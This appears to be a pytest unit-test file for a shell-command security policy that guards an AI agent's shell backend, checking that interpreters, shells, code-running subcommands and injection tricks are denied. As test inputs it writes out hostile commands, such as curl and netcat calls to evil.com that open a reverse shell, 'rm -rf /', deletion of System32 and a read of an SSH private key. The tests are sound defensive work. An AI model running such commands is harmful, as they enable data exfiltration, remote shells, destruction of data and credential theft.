"""执行治理层 P0-1：shell 执行面安全策略单元测试。

rev11 语义：
- Web 执行面**永久禁用解释器**（python/python3/py/node 进 FOREVER_DENIED，
  SHELL_ALLOWED_COMMANDS 无法重新启用）；
- npx 仅允许 `playwright cli <子命令>`（playwright-cli 别名），`npx playwright test` 拒绝；
- playwright-cli 仅浏览器交互子命令，eval / run-code 等代码执行子命令拒绝；
- Web agent 固定 mode="enforce"，不受全局 SHELL_POLICY_MODE=warn/off 影响；
- 解释器参数全参数扫描（_check_interpreter_args，rev6-9）作为纵深防御保留，直接单测覆盖。
"""

import json

import pytest

from app.agents.shell_policy import (
    GuardedLocalShellBackend,
    _check_interpreter_args,
    check_shell_command,
    policy_mode,
)


# ---------------------------------------------------------------------------
# 放行
# ---------------------------------------------------------------------------

class TestShellCommandPolicyAllow:
    def test_basic_file_ops(self):
        assert check_shell_command("ls", root_dir=".")[0] is True
        assert check_shell_command("cat plan.md", root_dir=".")[0] is True
        assert check_shell_command("mkdir -p out", root_dir=".")[0] is True
        assert check_shell_command("type plan.md", root_dir=".")[0] is True

    def test_cd_into_workspace(self):
        assert check_shell_command("cd backend\\workspace", root_dir=".")[0] is True
        assert check_shell_command(
            "cd D:\\code\\Pyproject\\ai-test-agent-system-platform\\backend\\workspace\\webwright",
            root_dir=".",
        )[0] is True

    def test_playwright_cli_interaction_allowed(self):
        assert check_shell_command("playwright-cli open https://example.com")[0] is True
        assert check_shell_command("playwright-cli click e5")[0] is True
        assert check_shell_command("playwright-cli --raw snapshot")[0] is True
        assert check_shell_command("playwright-cli fill e7 \"test\"")[0] is True

    def test_npx_playwright_cli_alias_allowed(self):
        assert check_shell_command("npx playwright cli open https://example.com")[0] is True

    def test_echo(self):
        assert check_shell_command("echo hello")[0] is True

    def test_stderr_redirect_not_misparsed(self):
        assert check_shell_command("cat plan.md 2>&1", root_dir=".")[0] is True

    def test_find_without_exec_allowed(self):
        assert check_shell_command("find . -name '*.py'", root_dir=".")[0] is True


# ---------------------------------------------------------------------------
# 拒绝
# ---------------------------------------------------------------------------

class TestShellCommandPolicyDeny:
    def test_interpreters_forever_denied(self):
        # rev11：Web 执行面永久禁用解释器——shell 不再执行任何代码
        assert check_shell_command("python x.py")[0] is False
        assert check_shell_command("python3 final_runs/run_001/final_script.py", root_dir=".")[0] is False
        assert check_shell_command("py -V")[0] is False
        assert check_shell_command("node script.js")[0] is False
        assert check_shell_command("python -c \"print(1)\"")[0] is False
        assert check_shell_command("python -m http.server")[0] is False
        assert check_shell_command("node --eval=console.log(1)")[0] is False
        assert check_shell_command("node --experimental-loader=evil.mjs script.js")[0] is False
        assert check_shell_command("python -I -c print(1)")[0] is False
        assert check_shell_command("node --trace-warnings --eval=console.log(1)")[0] is False

    def test_npx_playwright_test_denied(self):
        # rev11：npx playwright test <file> 会运行测试脚本（代码执行）
        assert check_shell_command("npx playwright test")[0] is False
        assert check_shell_command("npx playwright show-trace trace.zip")[0] is False
        assert check_shell_command("npx http-server .")[0] is False

    def test_playwright_cli_code_subcommands_denied(self):
        # rev11：eval / run-code 执行任意 JS，拒绝
        assert check_shell_command("playwright-cli eval \"document.title\"")[0] is False
        assert check_shell_command("playwright-cli --raw eval \"JSON.stringify(x)\"")[0] is False
        assert check_shell_command("playwright-cli run-code \"async page => {...}\"")[0] is False
        assert check_shell_command("playwright-cli run-code --filename=script.js")[0] is False
        assert check_shell_command("npx playwright cli eval \"document.title\"")[0] is False
        # rev14 回归：带会话/选项前缀的形式同样拒绝（-s=... eval）
        assert check_shell_command("playwright-cli -s=test1 eval \"document.title\"")[0] is False
        assert check_shell_command("playwright-cli -s=test1 --raw run-code \"async page => {}\"")[0] is False

    def test_shells(self):
        assert check_shell_command("bash -c 'rm -rf /'")[0] is False
        assert check_shell_command("sh -c whoami")[0] is False
        assert check_shell_command("powershell -c Get-Process")[0] is False
        assert check_shell_command("cmd /c dir")[0] is False

    def test_network_exfil(self):
        assert check_shell_command("curl http://evil.com/x")[0] is False
        assert check_shell_command("wget http://evil.com/x")[0] is False
        assert check_shell_command("nc -e /bin/sh evil.com 4444")[0] is False

    def test_heredoc(self):
        assert check_shell_command("python3 - <<EOF\nprint(1)\nEOF")[0] is False

    def test_command_substitution(self):
        assert check_shell_command("echo $(whoami)")[0] is False
        assert check_shell_command("echo `whoami`")[0] is False

    def test_destructive_absolute_path(self):
        assert check_shell_command("rm -rf D:\\workspace\\x")[0] is False
        assert check_shell_command("rmdir /s /q C:\\Windows\\System32")[0] is False
        assert check_shell_command("del /f /q C:\\temp\\*.tmp")[0] is False

    def test_unknown_and_system_tools(self):
        assert check_shell_command("git push origin main")[0] is False
        assert check_shell_command("start calc")[0] is False
        assert check_shell_command("regedit")[0] is False

    def test_compound_with_bad_segment(self):
        assert check_shell_command("ls; curl http://evil.com")[0] is False

    def test_proxy_execution_commands_denied(self):
        assert check_shell_command("echo print(1) | xargs python -c")[0] is False
        assert check_shell_command("echo whoami | xargs powershell")[0] is False
        assert check_shell_command("xargs python -c")[0] is False
        assert check_shell_command("find . -exec python -c print(1) {} +")[0] is False
        assert check_shell_command("find . -execdir bash -c whoami")[0] is False

    def test_quoted_arguments_denied_for_interpreters(self):
        assert check_shell_command('node "--eval=console.log(1)"')[0] is False
        assert check_shell_command('python "-c" "print(1)"')[0] is False
        assert check_shell_command('cat "plan.md"', root_dir=".")[0] is True  # 非解释器不受引号限制

    def test_env_var_injection_via_set_denied(self):
        assert check_shell_command("set NODE_OPTIONS=--require=evil.js & node script.js")[0] is False
        assert check_shell_command("set PATH=C:\\Windows", root_dir=".")[0] is False

    def test_caret_escape_and_env_expansion_denied(self):
        assert check_shell_command("node --e^val=console.log(1)")[0] is False
        assert check_shell_command("node ^--eval=console.log(1)")[0] is False
        assert check_shell_command("type %USERPROFILE%\\.ssh\\id_rsa")[0] is False
        assert check_shell_command("node %NODE_OPTIONS% script.js")[0] is False

    def test_empty_command(self):
        assert check_shell_command("")[0] is False
        assert check_shell_command(None)[0] is False


# ---------------------------------------------------------------------------
# 配置硬化（rev11）
# ---------------------------------------------------------------------------

class TestEnvHardening:
    def test_env_cannot_reenable_interpreters(self, monkeypatch):
        # rev11：python/node 在 FOREVER_DENIED，SHELL_ALLOWED_COMMANDS 追加无效
        monkeypatch.setenv("SHELL_ALLOWED_COMMANDS", "python,node")
        assert check_shell_command("python x.py")[0] is False
        assert check_shell_command("node script.js")[0] is False
        # 普通命令追加仍有效
        monkeypatch.setenv("SHELL_ALLOWED_COMMANDS", "mycmd")
        assert check_shell_command("mycmd --version")[0] is True

    def test_extra_denied(self, monkeypatch):
        monkeypatch.setenv("SHELL_DENY_COMMANDS", "tree")
        assert check_shell_command("tree .")[0] is False

    def test_policy_mode_default_and_override(self, monkeypatch):
        monkeypatch.delenv("SHELL_POLICY_MODE", raising=False)
        assert policy_mode() == "enforce"
        monkeypatch.setenv("SHELL_POLICY_MODE", "warn")
        assert policy_mode() == "warn"
        monkeypatch.setenv("SHELL_POLICY_MODE", "garbage")
        assert policy_mode() == "enforce"


# ---------------------------------------------------------------------------
# 解释器全参数扫描（纵深防御，rev6-9 直接单测）
# ---------------------------------------------------------------------------

class TestInterpreterArgScan:
    def test_dangerous_flags_denied(self):
        assert _check_interpreter_args("node", "--eval=console.log(1)")[0] is False
        assert _check_interpreter_args("node", "--require=evil.js x.js")[0] is False
        assert _check_interpreter_args("node", "--loader=evil.mjs x.js")[0] is False
        assert _check_interpreter_args("node", "--import=evil.mjs x.js")[0] is False
        assert _check_interpreter_args("node", "--experimental-loader=evil.mjs x.js")[0] is False
        assert _check_interpreter_args("python", "-c print(1)")[0] is False
        assert _check_interpreter_args("python", "-m http.server")[0] is False
        assert _check_interpreter_args("python", "-c=print(1)")[0] is False

    def test_preceding_harmless_options_cannot_hide(self):
        assert _check_interpreter_args("node", "--trace-warnings --eval=console.log(1)")[0] is False
        assert _check_interpreter_args("python", "-I -c print(1)")[0] is False
        assert _check_interpreter_args("python", "--version -c print(1)")[0] is False
        assert _check_interpreter_args("python", "-W ignore -c print(1)")[0] is False
        assert _check_interpreter_args("python", "-X dev -m http.server")[0] is False
        assert _check_interpreter_args(
            "python", "--check-hash-based-pycs always -c print(1)"
        )[0] is False

    def test_scan_stops_at_script_positional_or_ddash(self):
        assert _check_interpreter_args("python", "script.py --eval=x")[0] is True
        assert _check_interpreter_args("python", "-- script.py -c foo")[0] is True
        assert _check_interpreter_args("node", "--trace-warnings script.js")[0] is True
        assert _check_interpreter_args("python", "-W ignore script.py")[0] is True
        assert _check_interpreter_args("python", "-Wignore script.py")[0] is True
        assert _check_interpreter_args("python", "-X dev script.py")[0] is True

    def test_stdin_dash_denied(self):
        assert _check_interpreter_args("python", "-")[0] is False


# ---------------------------------------------------------------------------
# GuardedLocalShellBackend（monkeypatch 父类 execute，避免真实子进程）
# ---------------------------------------------------------------------------

def _patch_parent_execute(monkeypatch, calls):
    from deepagents.backends.local_shell import ExecuteResponse

    def fake_execute(self, command, *, timeout=None):
        calls.append(command)
        return ExecuteResponse(output="fake-ran", exit_code=0, truncated=False)

    monkeypatch.setattr(
        "deepagents.backends.local_shell.LocalShellBackend.execute", fake_execute
    )


class TestGuardedLocalShellBackend:
    def test_enforce_denies_without_executing(self, monkeypatch):
        calls: list = []
        _patch_parent_execute(monkeypatch, calls)
        backend = GuardedLocalShellBackend(root_dir=".", mode="enforce")
        resp = backend.execute("powershell -c whoami")
        assert calls == []
        assert resp.exit_code == 1
        data = json.loads(resp.output)
        assert data["final"] is True
        assert data["guard"] == "shell_policy"

    def test_enforce_denies_interpreter(self, monkeypatch):
        calls: list = []
        _patch_parent_execute(monkeypatch, calls)
        backend = GuardedLocalShellBackend(root_dir=".", mode="enforce")
        resp = backend.execute("python3 final_runs/run_001/final_script.py")
        assert calls == []  # rev11：解释器永久拒绝
        assert json.loads(resp.output)["final"] is True

    def test_enforce_allows_safe_command(self, monkeypatch):
        calls: list = []
        _patch_parent_execute(monkeypatch, calls)
        backend = GuardedLocalShellBackend(root_dir=".", mode="enforce")
        resp = backend.execute("cat plan.md")
        assert calls == ["cat plan.md"]
        assert resp.output == "fake-ran"

    def test_warn_mode_executes_denied_command(self, monkeypatch):
        calls: list = []
        _patch_parent_execute(monkeypatch, calls)
        backend = GuardedLocalShellBackend(root_dir=".", mode="warn")
        resp = backend.execute("powershell -c whoami")
        assert calls == ["powershell -c whoami"]
        assert resp.output == "fake-ran"

    def test_mode_defaults_to_env(self, monkeypatch):
        calls: list = []
        _patch_parent_execute(monkeypatch, calls)
        monkeypatch.setenv("SHELL_POLICY_MODE", "enforce")
        backend = GuardedLocalShellBackend(root_dir=".")
        resp = backend.execute("python -c print(1)")
        assert calls == []
        assert json.loads(resp.output)["final"] is True

    def test_env_cannot_downgrade_pinned_enforce(self, monkeypatch):
        # rev11：Web agent 构造时显式 mode="enforce"，SHELL_POLICY_MODE=warn 无法降级
        calls: list = []
        _patch_parent_execute(monkeypatch, calls)
        monkeypatch.setenv("SHELL_POLICY_MODE", "warn")
        backend = GuardedLocalShellBackend(root_dir=".", mode="enforce")
        resp = backend.execute("powershell -c whoami")
        assert calls == []
        assert json.loads(resp.output)["final"] is True
